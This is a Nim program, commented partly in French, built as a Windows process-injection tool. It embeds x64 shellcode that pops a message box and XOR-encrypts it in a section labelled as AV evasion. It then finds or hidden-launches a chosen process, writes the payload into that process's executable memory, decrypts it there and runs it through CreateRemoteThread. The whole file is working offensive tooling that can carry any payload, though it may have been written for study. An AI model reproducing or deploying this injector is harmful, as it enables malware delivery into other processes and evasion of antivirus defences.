import std/os, winim, net

# basic shellcode that pop a messagebox
var shellcode: array[321, byte] = [
byte 0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,
0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,0x48,0x31,0xd2,0x56,
0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
0x20,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x8b,0x72,
0x50,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,
0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,
0x20,0x8b,0x42,0x3c,0x41,0x51,0x48,0x01,0xd0,0x66,0x81,0x78,
0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,
0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,
0x8b,0x40,0x20,0x50,0x8b,0x48,0x18,0x49,0x01,0xd0,0xe3,0x56,
0x4d,0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,
0xd6,0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,0x01,0xc1,
0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,
0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,
0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,
0x04,0x88,0x41,0x58,0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,
0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,
0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,
0xff,0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75,0x73,0x65,0x72,
0x33,0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,0x41,0xba,0x4c,0x77,
0x26,0x07,0xff,0xd5,0x49,0xc7,0xc1,0x20,0x00,0x00,0x00,0xe8,
0x16,0x00,0x00,0x00,0x41,0x72,0x65,0x20,0x79,0x6f,0x75,0x20,
0x62,0x65,0x69,0x6e,0x67,0x20,0x68,0x61,0x63,0x6b,0x65,0x64,
0x3f,0x00,0x5a,0xe8,0x0e,0x00,0x00,0x00,0x41,0x72,0x65,0x20,
0x79,0x6f,0x75,0x20,0x74,0x68,0x6f,0x20,0x3f,0x00,0x41,0x58,
0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,0xff,0xd5,0x48,
0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,0xd5]

############################# AV EVASION TECHNIQUES ###########################################

# function to encrypt shellcode using XOR
proc xorEncrypt(shellcode: var array[321, byte], key: byte) =
    for i in 0..<shellcode.len:
        shellcode[i] = shellcode[i] xor key

# function to decrypt shellcode in memory using XOR and writing result in same allocated space
proc xorDecryptInMemory(hProcess: HANDLE, rPtr: LPVOID, key: byte) =
    var shellcode: array[321, byte] # variable pour recup le shellcode à partir de ReadProcessMemory()
    let is_Read = ReadProcessMemory(hProcess,    # api call to get crypted shellcode in memory
                                      rPtr,
                                      addr(shellcode),
                                      cast[SIZE_T](shellcode.len),
                                      nil)

    # validation sinon on sort de la fonction
    if is_Read == False:
        echo "Reading memory failed..."
        return
    
    # on réutilise xorEncrytp pour déchiffrer vu que xor est symmetric
    xorEncrypt(shellcode, key) 

    # on réecrit le shellcode déchiffré en mémoire
    let is_Written = WriteProcessMemory(hProcess,
                                    rPtr,
                                    addr(shellcode),
                                    cast[SIZE_T](shellcode.len),
                                    nil)      


################## OBTENIR PID POUR PROCESS INJECTION ######################################

# fonction nécessaire pour convertir la liste des noms de processus en cours de code machine à lisible
proc toString(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))

# fonction pour checker si le processus candidat fait partie des processus en cours
proc is_running(process: string): bool =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        if entry.szExeFile.toString == process:
            return true
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process:
                return true
    return false

# fonction pour récup le pid à partir de la liste des processus en cours
proc getPid(process: string): DWORD =
    var 
        entry: PROCESSENTRY32
        hSnapshot: HANDLE

    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)

    if Process32First(hSnapshot, addr entry):
        if entry.szExeFile.toString == process:
            return entry.th32ProcessID
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == process:
                return entry.th32ProcessID


################################ PROCESS INJECTION ##########################################

# function for remote process injection of selected process
proc Injection(processID: DWORD, key: byte): bool = 
    # first we need a handle on the process 
    let hProcess = OpenProcess(PROCESS_ALL_ACCESS, # functions here return a handle of the specified process
                        False,
                        processID)         

    # validation 
    if hProcess == 0:              # return value is handle to specified process or NULL if failed
        echo "handle not obtained"
    else: 
        echo "handle obtained" 

    # une fois qu'on a le handle on va allouer de l'espace mémoire dans le process distant 
    let rPtr = VirtualAllocEx(hProcess,       # prend en input le handle qu'on vient d'obtenir
                            nil,
                            cast[SIZE_T](shellcode.len),
                            MEM_COMMIT,
                            PAGE_EXECUTE_READWRITE)

    # validation 
    if rPtr == nil:                             # return memory address allocated or NULL if failed
        echo "virtual memory allocation failed"
    else: 
        echo "virtual memory allocation success" 


    # now that we have memory allocated in distant process we are goind to write data to it
    let is_Success = WriteProcessMemory(hProcess,
                                    rPtr,
                                    addr(shellcode),
                                    cast[SIZE_T](shellcode.len),
                                    nil)       

    # validation 
    if is_Success == False:
        echo "writing to memory failed"
    else:
        echo "writing to memory successful"
    
    # Appliquer le chiffrement sur le shellcode
    echo "Déchiffrement du shellcode en mémoire..."
    xorDecryptInMemory(hProcess, rPtr,  key)
    echo "Shellcode déchiffré"

    # une fois le shellcode écrit dans l'espace mémoire alloué du process distant on va executer le shellcode
    let hThread = CreateRemoteThread(hProcess,      # fonction return le handle du thread
                                    nil,
                                    0,
                                    cast[LPTHREAD_START_ROUTINE](rPtr), 
                                    nil,
                                    0,           
                                    nil)      

    # validation                            
    if hThread == cast[HANDLE](nil):
        echo "threading failed"
    else:
        echo "threading success"

    # have to tell computer to wait for process to execute 
    WaitForSingleObject(hThread, INFINITE)
    # closing the handle when we are done for clean up
    CloseHandle(hProcess)


############################# MAIN PROGRAM ###########################################

when isMainModule:

    # Appliquer le chiffrement sur le shellcode
    let key: byte = 0xAA  # Clé de chiffrement XOR 
    xorEncrypt(shellcode, key)
    echo "Shellcode chiffré..."

    echo "Enter process to inject shellcode in:"

    # user input pour le processus dans lequel injecter notre shellcode
    let processName = readLine(stdin)

    # looking if process is already running, if not spawn it with winExec()
    if not is_running(processName):
        echo "Process not running...Launching process: ", processName
        WinExec(processName, SW_HIDE)
        sleep(1000)
        echo "Process ", processName, " now running..."

    # process running now so we can get process ID
    echo "Looking for process ID..."
    let processID= getPid(processName)
    echo "Process ID: ", processID

    # once we obtain the process ID we can inject shellcode into remote process
    echo "Process injection..."
    let is_success = Injection(processID, key)

    # validation
    if not is_success:
        echo "injection failed"
    else:
        echo "injection successful"
